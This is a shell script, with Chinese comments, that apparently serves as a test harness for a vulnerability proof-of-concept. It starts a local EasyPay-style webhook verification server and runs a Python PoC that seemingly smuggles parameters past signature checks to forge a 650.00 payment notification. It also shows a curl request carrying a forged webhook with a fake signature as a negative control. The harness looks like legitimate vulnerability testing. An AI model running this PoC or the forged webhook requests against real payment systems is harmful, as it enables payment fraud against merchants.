#!/bin/sh
# One-shot end-to-end: real easypay.go verification server + real Python PoC.
cd "$(dirname "$0")/go-poc" || exit 1

if ! command -v go >/dev/null 2>&1; then
    echo "[!] 这个终端里没有 go，真实端到端跑不了。"
    echo "    至少可以跑纯 Python 交叉验证："
    echo "      cd .. && python3 model_check.py"
    exit 1
fi

GOTOOLCHAIN=local go build -o /tmp/pocserver ./cmd/pocserver || exit 1
/tmp/pocserver > /tmp/pocserver.log 2>&1 &
SRV=$!
trap 'kill $SRV 2>/dev/null' EXIT
sleep 2

echo "############ 真实验签服务端 + 真实 PoC ############"
cd ..
SUB2API_PASSWORD=correct-horse python3 easypay_smuggle_poc.py \
    --base http://127.0.0.1:8900 --email tester@example.com \
    --amount 650.00 --send 2>&1 | tail -12

echo
echo "############ 服务端验签日志 ############"
grep -E 'ACCEPTED|VERIFY FAILED' /tmp/pocserver.log

echo
echo "############ 反向对照：垃圾签名必须被拒 ############"
curl -s -w "  <- HTTP %{http_code}\n" \
  "http://127.0.0.1:8900/api/v1/payment/webhook/easypay?money=1.00&name=x&notify_url=n&out_trade_no=sub2_TESTORDER_0001&pid=1&return_url=x&trade_status=TRADE_SUCCESS&sign=deadbeefdeadbeefdeadbeefdeadbeef&sign_type=MD5"
grep -E 'VERIFY FAILED' /tmp/pocserver.log | tail -1